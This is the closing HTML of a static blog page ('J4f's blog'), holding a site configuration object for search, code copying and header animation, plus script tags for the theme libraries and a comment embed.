    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"data":{"desktop-header-typeit":"J4f's blog","mobile-header-typeit":"J4f's blog"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script></div>
</body>

</html>
